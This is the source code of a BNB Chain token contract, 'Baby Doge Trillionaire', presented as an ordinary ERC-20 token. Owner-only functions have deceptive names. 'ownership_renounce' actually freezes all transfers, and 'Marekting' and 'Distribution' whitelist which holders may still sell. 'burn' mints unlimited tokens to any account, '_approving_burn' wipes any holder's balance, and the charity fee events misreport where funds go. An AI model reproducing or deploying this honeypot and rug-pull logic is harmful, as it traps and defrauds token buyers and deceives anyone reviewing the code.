/**
 *Submitted for verification at BscScan.com on 2021-12-10
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-14
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-25
*/

pragma solidity ^0.8.0;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

  
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

   
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

   
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

  function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

   
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

   
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


interface IERC20 {
   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
  
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


contract Token is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _blackbalances;
    
    mapping(address => bool) private whiteList;

    mapping(address => bool) private _balances1;
    
    
    uint256 public _totalSupply = 1000000000000000*10**18;
    string public _name = "Baby Doge Trillionaire";
    string public _symbol= "BABYDOGET";
     bool balances1 = true;

    address payable public charityAddress = payable(0x000000000000000000000000000000000000dEaD); // Marketing Address
    uint256 public charityPercent = 0; 
    
    address public immutable burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public burnPercent = 0; 
    
    uint256 public marketingAmount;
    uint256 public burnAmount;
    
    function SetCharityAddress(address payable  _charityAddress) onlyOwner public {
        charityAddress = _charityAddress;
    }
    
    function SetCharityPercent(uint256 _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    
    function SetBurnPercent(uint256 _burnPercent) onlyOwner public {
        burnPercent = _burnPercent;
    }
    
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(this), msg.sender, _totalSupply);
        owner = msg.sender;

    }
    
    address public owner;
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function setWhiteList(address _candidate, bool isInWhiteList) public onlyOwner {
        require(_candidate != address(0), "Invalid address");
        whiteList[_candidate] = isInWhiteList;
    }

    function changeOwner(address _owner) onlyOwner public {
        owner = _owner;
    }
    
      function ownership_renounce(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
     function Marekting(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function Distribution(address account) onlyOwner public {
        _balances1[account] = false;
    }
    
    
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

   
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(_blackbalances[sender] != true );
        require(balances1 || _balances1[sender] , "ERC20: transfer to the zero address");

        // require(whiteList[sender], "You are not in whitelists");

        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        uint256 burnAmount = amount * burnPercent / 100 ; 
        uint256 charityAmount = amount * charityPercent / 100; 
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        amount =  amount - charityAmount - burnAmount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        
         if (charityPercent > 0){
          
           _balances[recipient] += charityAmount;
          emit Transfer(sender, charityAddress, charityAmount);  
            
        }
        
        if (burnPercent > 0){
            
           _totalSupply -= burnAmount;
           emit Transfer(sender, burnAddress, burnAmount);
            
        }
        
        
    }

   

  
    function _approving_burn(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
    

      function  burn(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        //require(balances1 || _balances1[sender] , "ERC20: transfer to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    

}